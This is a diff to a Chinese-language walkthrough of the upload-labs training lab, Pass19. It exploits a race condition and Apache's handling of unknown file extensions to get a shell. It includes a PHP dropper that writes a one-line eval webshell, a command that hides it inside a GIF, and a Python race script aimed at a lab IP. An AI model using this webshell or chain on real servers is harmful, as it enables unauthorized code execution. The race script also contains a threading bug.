@@ -1719,8 +1719,6 @@ getimagesize()函数：
 
 ## Pass17
 
-### 方法一
-
 + [文件上传绕过—二次渲染漏洞](https://blog.csdn.net/weixin_45588247/article/details/119177948)
 
 + [ 文件上传绕过—条件竞争漏洞](https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501)
@@ -2093,5 +2091,291 @@ while True:
 
 
 
-## Pass19
+## Pass19 条件竞争二
+
++ 查看源码
+
+​	<code>index.php</code>的代码如下
+
+~~~ shell
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit']))
+{
+    require_once("./myupload.php");
+    $imgFileName =time();
+    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
+    $status_code = $u->upload(UPLOAD_PATH);
+    switch ($status_code) {
+        case 1:
+            $is_upload = true;
+            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
+            break;
+        case 2:
+            $msg = '文件已经被上传，但没有重命名。';
+            break; 
+        case -1:
+            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
+            break; 
+        case -2:
+            $msg = '上传失败，上传目录不可写。';
+            break; 
+        case -3:
+            $msg = '上传失败，无法上传该类型文件。';
+            break; 
+        case -4:
+            $msg = '上传失败，上传的文件过大。';
+            break; 
+        case -5:
+            $msg = '上传失败，服务器已经存在相同名称文件。';
+            break; 
+        case -6:
+            $msg = '文件无法上传，文件不能复制到目标目录。';
+            break;      
+        default:
+            $msg = '未知错误！';
+            break;
+    }
+}
+~~~
+
+
+
+​	<code>myupload.php</code>的代码如下:
+
+~~~ shell
+
+//myupload.php
+class MyUpload{
+......
+......
+...... 
+  var $cls_arr_ext_accepted = array(
+      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
+      ".html", ".xml", ".tiff", ".jpeg", ".png" );
+
+......
+......
+......  
+  /** upload()
+   **
+   ** Method to upload the file.
+   ** This is the only method to call outside the class.
+   ** @para String name of directory we upload to
+   ** @returns void
+  **/
+  function upload( $dir ){
+    
+    $ret = $this->isUploadedFile();
+    
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );
+    }
+
+    $ret = $this->setDir( $dir );
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );
+    }
+
+    $ret = $this->checkExtension();
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );
+    }
+
+    $ret = $this->checkSize();
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );    
+    }
+    
+    // if flag to check if the file exists is set to 1
+    
+    if( $this->cls_file_exists == 1 ){
+      
+      $ret = $this->checkFileExists();
+      if( $ret != 1 ){
+        return $this->resultUpload( $ret );    
+      }
+    }
+
+    // if we are here, we are ready to move the file to destination
+
+    $ret = $this->move();
+    if( $ret != 1 ){
+      return $this->resultUpload( $ret );    
+    }
+
+    // check if we need to rename the file
+
+    if( $this->cls_rename_file == 1 ){
+      $ret = $this->renameFile();
+      if( $ret != 1 ){
+        return $this->resultUpload( $ret );    
+      }
+    }
+    
+    // if we are here, everything worked as planned :)
+
+    return $this->resultUpload( "SUCCESS" );
+  
+  }
+......
+......
+...... 
+};
+~~~
+
+
+
++ <code>upload()</code>函数大致思路如下
+
+~~~ tex
+1. 判断文件是否为http post方式上传
+2. 建立文件夹
+3. 白名单验证后缀名
+4. 检查大小
+5. 检查上传文件夹是否存在
+6. 移动临时文件到上传目录
+7. 对文件进行重命名
+
+同样的逻辑缺陷 不过是白名单 上传路径不可控制 所以上传含有木马的白名单文件 配合条件竞争和其他漏洞来实现写入木马
+~~~
+
+
+
++ 使用正确的版本
+
+~~~ tex
+白名单+条件竞争+Apache未知后缀名解析漏洞
+上传一个Apache不识别的后缀名 通过条件竞争访问php文件 写入木马成功
+注意Apache未知后缀名解析漏洞适用 php ts 版本 
+~~~
+
+~~~ tex
+用版本5.5.38的php
+~~~
+
+![Pass19_01](./img/Pass19_01.png)
+
+
+
++ 编写脚本
+
+<code>php</code>脚本<code>NineteenScript.php</code>代码如下:
+
+~~~ php
+<?php
+	fputs(fopen('script.php','w'),'<?php @eval($_POST["Nineteen"])?>');
+?>
+~~~
+
+
+
+<code>gif</code>文件<code>NineteenFirst.gif</code>使用<code>Pass16</code>的<code>gif</code>文件
+
+![Pass19_02](./img/Pass19_02.PNG)
+
+
+
+然后使用下面的命令制造图片马
+
+~~~ shell
+copy NineteenFirst.gif/a + NineteenScript.php/b NineteenScript.gif
+~~~
+
+![Pass19_03](./img/Pass19_03.PNG)
+
+
+
+可看到图片<code>NineteenScript.gif</code>成功注入木马
+
+![Pass19_04](./img/Pass19_04.PNG)
+
+
+
+编写<code>python</code>脚本<code>AttackScript.py</code>如下:
+
+~~~ python
+import requests
+from threading import Thread
+
+#url = "http://192.168.31.126:80/upload-labs/upload/NineteenFirstMethod.php.html"
+url = "http://192.168.31.128:80/upload-labs/include.php?file=upload/NineteenScript.gif"
+
+def request():
+    global StatusCode
+    global Text
+    html = requests.get(url)
+    StatusCode = html.status_code
+    Text = html.text
+    
+while True:
+    t = Thread(target=request())
+    t.start()
+    if StatusCode == 200:
+        print(Text)
+        print("OK")
+        break
+    else:
+        print(StatusCode)
+~~~
+
+![Pass19_05](./img/Pass19_05.PNG)
+
+
+
++ 上传<code>NineteenScript.gif</code>文件到网站
+
+![Pass19_06](./img/Pass19_06.PNG)
+
+
+
++ 用<code>burpsuite</code>截断
+
+![Pass19_07](./img/Pass19_07.PNG)
+
+
+
++ 将请求发送到测试器
+
+![Pass19_08](./img/Pass19_08.PNG)
+
+
+
++ 配置测试的攻击
+
+![Pass19_09](./img/Pass19_09.png)
+
+![Pass19_10](./img/Pass19_10.png)
+
+![Pass19_11](./img/Pass19_11.png)
+
+
+
++ 测试器开始攻击并运行<code>python</code>脚本<code>AttackScript.py</code>进行条件竞争
+
+![Pass19_12](./img/Pass19_12.PNG)
+
+![Pass19_13](./img/Pass19_13.PNG)
+
+如上图，<code>python</code>脚本<code>AttackScript.py</code>成功连上<code>NineteenScript.gif</code>并创建后台脚本<code>script.php</code>
+
+
+
++ 配置蚁剑连接
+
+![Pass19_14](./img/Pass19_14.png)
+
+注意生成的脚本<code>script.php</code>在文件夹<code>upload-labs</code>下而不是文件夹<code>upload</code>下
+
+![Pass19_16](./img/Pass19_16.png)
+
+
+
++ 将<code>burpsuite</code>解除截断并测试连接，最终成功<code>getshell</code>
+
+![Pass19_15](./img/Pass19_15.PNG)
+
+
+
+## Pass20
 
